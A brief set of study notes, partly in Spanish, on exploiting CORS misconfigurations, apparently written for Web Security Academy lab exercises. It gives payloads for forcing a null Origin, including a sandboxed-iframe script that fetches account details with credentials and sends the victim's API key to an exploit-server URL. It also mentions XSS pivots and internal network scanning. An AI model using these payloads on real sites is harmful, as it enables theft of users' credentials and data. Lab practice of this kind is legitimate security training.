CORS

########### Lograr Origin null ###########
- Cross-origin redirect: Location al sitio objetivo

- Requests from serialized data.
data:text/html,<script>
fetch("https://api.ejemplo.com/data", {
  method: "POST",
  body: JSON.stringify({ test: "data-url" })
});
</script>

- Request using the file: protocol. (puede ir en base64)
<!-- file:///C:/test.html -->
<script>
fetch("https://api.ejemplo.com/data", { method: "POST" })
</script>

- Sandboxed cross-origin requests.
<iframe sandbox="allow-scripts allow-forms" srcdoc='
<script>
fetch("https://0aff004e03645cd8804a494200fe0086.web-security-academy.net/accountDetails", {
  credentials: "include"
})
.then(r => r.json())
.then(d => {
  location = "https://exploit-0af300a303c25c5a807c483f013800d0.exploit-server.net/test?apikey=" + d.apikey;
});
</script>
'></iframe>

########### Mediante XSS ###########

Se puede acceder al recurso mediante de uno confiable pero con xss

########### Curiosidad ###########

Puedo ejecutar un CORS desde mi página atacante.com y escanear la red interna para acceder a recursos.

